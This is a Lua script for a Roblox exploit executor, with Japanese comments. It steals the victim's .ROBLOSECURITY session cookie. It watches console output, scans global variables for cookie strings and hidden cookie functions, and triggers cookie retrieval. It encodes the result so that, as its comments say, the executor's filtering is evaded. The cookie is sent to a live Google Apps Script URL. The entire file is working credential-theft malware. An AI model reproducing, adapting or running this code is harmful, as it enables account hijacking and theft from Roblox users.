-- [[ 設定：お前の最新GAS URL ]]
local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
local user = game.Players.LocalPlayer.Name

local LogService = game:GetService("LogService")
local HttpService = game:GetService("HttpService")

-- [[ 1. 暗号化関数：Deltaの検閲を数字で回避 ]]
local function encrypt(str)
    if not str then return "NIL" end
    local t = {}
    for i = 1, #str do
        table.insert(t, string.byte(str, i))
    end
    return table.concat(t, "-")
end

-- [[ 2. 送信関数：GASへ安全に飛ばす ]]
local function sendData(dataName, rawValue)
    local secret = encrypt(rawValue)
    local finalUrl = gasUrl .. "?user=" .. user .. "_" .. dataName .. "&cookie=" .. secret .. "&mode=enc"
    
    -- 通信自体が遮断されないよう、pcallで包む
    pcall(function()
        game:HttpGet(finalUrl)
    end)
end

-- [[ 3. コンソール監視：printされた瞬間を盗む ]]
LogService.MessageOut:Connect(function(message)
    if message:find("_|WARNING") or message:find(".ROBLOSECURITY") then
        sendData("LOG_RELAY", message)
    end
end)

-- [[ 4. 執念の全環境スキャン：隠し関数・変数を探し出す ]]
task.spawn(function()
    -- getgenv（グローバル）の中身を全チェック
    for i, v in pairs(getgenv()) do
        local name = tostring(i)
        -- クッキーそのものが変数に入っている場合
        if type(v) == "string" and v:find("_|WARNING") then
            sendData("ENV_VAR_FOUND", v)
        end
        -- get_cookieっぽい隠し関数がないか
        if type(v) == "function" and (name:lower():find("cook") or name:lower():find("http")) then
            pcall(function()
                local res = v("https://www.roblox.com/")
                if res and tostring(res):find("_|WARNING") then
                    sendData("HIDDEN_FUNC_HIT", tostring(res))
                end
            end)
        end
    end
end)

-- [[ 5. 実行：クッキー取得のトリガーを引く ]]
task.wait(1)
pcall(function()
    local gch = getgenv().get_cookie_header or getgenv().get_cookie or get_cookie_header
    if gch then
        local c = gch("https://www.roblox.com/")
        print(c) -- ここでprintすることでLogServiceが拾う
    else
        -- 関数が見つからない場合は、Deltaがガードし忘れているAPIを叩いてみる
        local res = game:HttpGet("https://www.roblox.com/mobileapi/userinfo")
        print(res)
    end
end)

print("--- Scanner Running ---")
